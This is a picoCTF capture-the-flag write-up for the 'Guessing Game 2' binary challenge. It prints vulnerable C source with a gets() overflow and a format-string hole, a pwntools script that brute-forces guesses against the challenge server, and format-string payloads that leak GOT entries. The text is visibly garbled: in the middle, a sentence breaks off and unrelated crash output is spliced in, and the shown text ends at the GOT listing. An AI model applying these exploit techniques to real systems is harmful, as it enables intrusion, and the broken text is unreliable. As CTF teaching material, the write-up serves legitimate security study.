# Guessing Game 2
Category: Binary Exploitation
## Description
> It's the Return of your favorite game! 
```c
#include 
#include 
#include 
#include 
#include 
#define BUFSIZE 512
long get_random() {
	return rand;
}
int get_version() {
	return 2;
}
int do_stuff() {
	long ans = (get_random() % 4096) + 1;
	int res = 0;
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}
void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	gets(winner);
	printf("Congrats: ");
	printf(winner);
	printf("\n\n");
}
int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	int res;
	printf("Welcome to my guessing game!\n");
	printf("Version: %x\n\n", get_version());
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	return 0;
}
```
Makefile:
```makefile
all:
	gcc -m32 -no-pie -Wl,-z,relro,-z,now -o vuln vuln.c
clean:
	rm vuln
```
In addition, a binary file was included.
## Solution
This is the follow-up for [Guessing Game 1](Guessing_Game_1.md). Once more, we have a short program which randomly selects a number, and asks the user to guess it. If successful, the user can enter a name and be congratulated. 
Just like last time, the random number generated by `get_random()` isn't really random. However, at least last time it was pseudo-random. This time it's a constant! 
```c
long get_random() {
	return rand;
}
```
Instead of calling `rand()`, the function is returning the address of the `rand()` function modulus 4096. Why is this important? Because the address of `rand()` might be randomized by the loader, but if we apply modulus 4096 to it we effectively get a constant value:
Even if ASLR is enabled and `libc` gets loaded to a different address during each run, it still needs to get loaded to a page-aligned address, where pages are (usually) 4K. Therefore, the offset within each page needs to be constant, and in order to represent an offset within a 4K buffer we need 12 bits.
This means that the bottom 12 bits of `rand`'s address don't change between runs, only the top bits get randomized. When we apply modulus 4096 to a number, we are essentially extracting the bottom 12 bits of that number. In our case, since these bits aren't affected by ASLR, we actually get a constant result.
We still have to find the correct offset for `rand` though. Although for a given `LibC` the offset of `rand` within the library is constant, each `LibC` might have a different offset for `rand` and we don't which `LibC` the server is using. We'll get to that in a moment, but let's just perform a local sanity check before moving on.
We'll use `gdb` to check the `rand` offset on our local machine, and see if we can bypass the guess phase:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# gdb ./vuln -ex "set disable-randomization off" -ex "b main" -ex "r" -ex 'printf "rand = 0x%x\n", rand' -ex "set confirm off" -ex "q" -n | grep rand
rand = 0xf7d92860
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# gdb ./vuln -ex "set disable-randomization off" -ex "b main" -ex "r" -ex 'printf "rand = 0x%x\n", rand' -ex "set confirm off" -ex "q" -n | grep rand
rand = 0xf7dae860
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# gdb ./vuln -ex "set disable-randomization off" -ex "b main" -ex "r" -ex 'printf "rand = 0x%x\n", rand' -ex "set confirm off" -ex "q" -n | grep rand
rand = 0xf7d5d860
```
This command enables ASLR, then prints the `rand` offset and exits. We run it three times and we can see that we got three different results, although the bottom 12 bits are constant as we explained earlier. Now, according to the code, the calculation is:
```python
>>> (0xf7d92860 % 4096) + 1
2145
>>> (0xf7dae860 % 4096) + 1
2145
>>> (0xf7d5d860 % 4096) + 1
2145
```
Let's try it:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# ./vuln
Welcome to my guessing game!
Version: 2
What number would you like to guess?
2145
Nope!
```
That didn't work! 
The reason is that the C program treats the variables as `signed` integers, and a signed `long` with the value of `0xf7d92860` in a 32-bit program is interpreted as a negative number. The following program can demonstrate this:
```c
#include 
int main()
{
    long random = 0xf7d92860;
    long ans = (random % 4096) + 1;
    printf("random = %ld\n", random);
    printf("ans    = %ld\n", ans);
    return 0;
}
```
Output:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# gcc -m32 test.c -o test && ./test
random = -136763296
ans    = -1951
```
Let's try `-1951`:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# ./vuln
Welcome to my guessing game!
Version: 2
What number would you like to guess?
-1951
Congrats! You win! Your prize is this print statement!
```
This looks much better. We can mimic a similar behavior in Python using a negative modulus, e.g.:
```python
>>> (0xf7d92860 % -4096) + 1
-1951
```
Notice that this only happens if `LibC` gets loaded to an address which when interpreted as a signed `long` is considered negative (i.e. when the MSB is set). We don't know where the server's loader will load `LibC` to, but it is a fairly safe assumption that it will be loaded to such an address, therefore we'll assume that also on the server `ans` will end up negative.
We still need to find the correct offset/value to bypass the first phase. We have a few options:
1. Brute force all possible positive and negative value -> Too many values
2. Brute force all possible negative values -> Still around 4096 values, not very tempting
3. Use a `libc` database in order to create a list of known `rand` offsets, then try them
We'll go for option #3 using [libc-database](https://github.com/niklasb/libc-database). After downloading the database, we use the following script in order to try all known `rand` offsets:
```python
from pwn import *
import ctypes
from pathlib import Path
from collections import defaultdict, namedtuple
LIBC_DB_BASE = "../../../Utils/libc-database"
LIBC_DB_DUMP = Path(LIBC_DB_BASE, "dump")
Record = namedtuple("Record", "name offset")
def get_rand_offset_map():
    res = defaultdict(list)
    with log.progress('Retrieving rand() offsets') as p:
        for i, libc_path in enumerate(Path(LIBC_DB_BASE, "db").glob("*.so")):
            p.status(f"Read {i} libraries")
            with context.local(log_level='ERROR'):
                output = process('{} {} rand'.format(LIBC_DB_DUMP, libc_path.stem), shell=True).recvall().decode("ascii")
            offset = int(output.replace("offset_rand =", "").strip(), 16)
            guess = ctypes.c_int32((offset % -4096) + 1).value
            res[guess].append(Record(libc_path.stem, offset))
    return res
def test_guesses(rand_offset_map):
    with log.progress('Testing against server') as p:
        for i, guess in enumerate(rand_offset_map.keys()):
            p.status(f"Tested {i} offsets")
            with context.local(log_level='ERROR'):
                r = remote("jupiter.challenges.picoctf.org", 28953)
                r.recvuntil("What number would you like to guess?\n")
                r.sendline(str(guess))
                output = r.recvline()
                r.close()
                if b"Congrats" in output:
                    return guess
    return None
def main():
    rand_offset_map = get_rand_offset_map()
    log.info("Found {} unique guess values".format(len(rand_offset_map)))
    guess = test_guesses(rand_offset_map)
    if guess is not None:
        log.success(f"Found correct guess: '{guess}'")
        log.info("Matching libraries:")
        for record in rand_offset_map[guess]:
            log.info("0x{:#08x}: {}".format(record.offset, record.name))
    else:
        log.failure("Can't find correct guess")
if __name__ == "__main__":
    main()
```
Output:
```console
$ python3 guess_rand.py
[+] Retrieving rand() offsets: Done
[*] Found 178 unique guess values
[+] Testing against server: Done
[+] Found correct guess: '-31'
[*] Matching libraries:
[*] 0x0x02ffe0: libc6-i386_2.8~20080505-0ubuntu9_amd64
[*] 0x0x030fe0: libc6-i386_2.27-3ubuntu1.2_amd64
```
We can see that we were able to reduce the search range to  terminated
Aborted
```
So, no buffer overflow this time. It also dynamically linked:
```console
root@kali:/media/sf_CTFs/pico/Guessing_Game_2# ldd ./vuln
        linux-gate.so.1 (0xf7f09000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d10000)
        /lib/ld-linux.so.2 (0xf7f0b000)
```
This means that we have less gadgets to play with.
Luckily we have a format string vulnerability, since user controlled input is passed directly to `printf` without sanitization:
```c
	gets(winner);
	printf("Congrats: ");
	printf(winner);
```
This allows us to print values from the stack:
```
New winner!
Name? %p.%p.%p.%p
Congrats: 0x200.0xf7f545c0.0x804877d.0x1
```
With some trial and error (or automation using `pwntools` as seen below), we can identify that the seventh offset allows us to read back a value that we entered:
```
Name? AAAA%7$p
Congrats: AAAA0x41414141
```
This allows us to read (almost) any memory address by using `%s`. We can leak the address of `rand` from the GOT by sending:
```
    00000000  f8 9f 04 08  25 37 24 73                            │····│%7$s│
```
The GOT address for `rand` (`0x08049ff8`) can be retrieved using the debugger:
```
gdb-peda$ got
/media/sf_CTFs/pico/Guessing_Game_2/vuln:     file format elf32-i386
DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
08049ff4 R_386_GLOB_DAT    stdin@GLIBC_2.0
08049ff8 R_386_GLOB_DAT    rand@GLIBC_2.0
08049ffc R_386_GLOB_DAT    stdout@GLIBC_2.0
08049fc8 R_386_JUMP_SLOT   printf@GLIBC_2.0
08049fcc R_386_JUMP_SLOT   gets@GLIBC_2.0
08049fd0 R_386_JUMP_SLOT   fgets@GLIBC_2.0
08049fd4 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
08049fd8 R_386_JUMP_SLOT   getegid@GLIBC_2.0
08049fdc R_386_JUMP_SLOT   puts@GLIBC_2.0
08049fe0 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
08049fe4 R_386_JUMP_SLOT   atol@GLIBC_2.0
08049fe8 R_386_JUMP_SLOT   setvbuf@GLIBC_2.0
08049fec R_386_JUMP_SLOT   setresgid@GLIBC_2.0
```